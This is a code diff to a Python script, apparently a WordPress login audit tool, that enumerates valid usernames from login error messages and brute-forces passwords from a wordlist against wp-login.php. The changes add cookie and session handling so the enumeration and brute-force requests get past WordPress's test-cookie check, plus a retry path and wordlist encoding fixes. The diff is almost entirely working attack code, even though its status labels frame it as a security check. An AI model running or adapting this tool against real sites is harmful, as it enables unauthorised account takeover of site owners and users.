@@ -111,8 +111,12 @@ def phase2_confirm_username(base_url, username):
     print(f"  Testing username: {username}\n")
 
     try:
+        # First GET the login page to collect cookies (WordPress requires testcookie)
+        session = requests.Session()
+        session.get(login_url, timeout=10)
+
         # Test with the target username
-        resp = requests.post(login_url, data={
+        resp = session.post(login_url, data={
             "log": username,
             "pwd": "definitely_wrong_password_12345",
             "wp-submit": "Log In",
@@ -134,6 +138,30 @@ def phase2_confirm_username(base_url, username):
             print(f"  {GREEN}[SECURED]{RESET} Server uses GENERIC error message.")
             print(f"  Attacker cannot determine if username is valid.")
             return False
+        elif "cookies" in body.lower() and "blocked" in body.lower():
+            print(f"  {YELLOW}[RETRY]{RESET} Cookie issue, retrying with fresh session...")
+            # Some WP setups need the cookie from the GET before POST works
+            session2 = requests.Session()
+            session2.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
+            resp2 = session2.post(login_url, data={
+                "log": username,
+                "pwd": "definitely_wrong_password_12345",
+                "wp-submit": "Log In",
+                "redirect_to": urljoin(base_url, "/wp-admin/"),
+                "testcookie": "1"
+            }, allow_redirects=True, timeout=10)
+            body2 = resp2.text
+            if "incorrect" in body2.lower() and username.lower() in body2.lower():
+                print(f"  {RED}[VULNERABLE]{RESET} Server confirms username EXISTS:")
+                print(f'  Error: "The password you entered for the username {username} is incorrect."')
+                print(f"\n  {YELLOW}This means an attacker knows this is a VALID account to brute-force.{RESET}")
+                return True
+            elif "not registered" in body2.lower() or "invalid username" in body2.lower():
+                print(f"  {GREEN}[SAFE]{RESET} Server says username does NOT exist.")
+                return False
+            else:
+                print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern after retry.")
+                return True  # Assume vulnerable if uncertain
         else:
             print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern.")
             print(f"  Response snippet: {body[body.find('login_error'):body.find('login_error')+200] if 'login_error' in body else 'N/A'}")
@@ -210,15 +238,24 @@ def phase3_bruteforce(base_url, username, passwords):
     found = False
     start_time = time.time()
 
+    # Use a session to maintain cookies (required by WordPress)
+    session = requests.Session()
+    session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
+    # Warm up the session with a GET to collect any server-set cookies
+    try:
+        session.get(login_url, timeout=10)
+    except requests.RequestException:
+        pass
+
     for i, password in enumerate(passwords, 1):
         try:
-            resp = requests.post(login_url, data={
+            resp = session.post(login_url, data={
                 "log": username,
                 "pwd": password,
                 "wp-submit": "Log In",
                 "redirect_to": urljoin(base_url, "/wp-admin/"),
                 "testcookie": "1"
-            }, allow_redirects=False, timeout=10)
+            }, allow_redirects=False, timeout=15)
 
             # WordPress redirects to wp-admin on successful login (302)
             if resp.status_code == 302:
@@ -370,7 +407,7 @@ def main():
     if not args.skip_bruteforce:
         if args.wordlist:
             try:
-                with open(args.wordlist) as f:
+                with open(args.wordlist, encoding="latin-1") as f:
                     passwords = [line.strip() for line in f if line.strip()]
                 print(f"\n  Loaded {len(passwords)} passwords from {args.wordlist}")
             except FileNotFoundError:
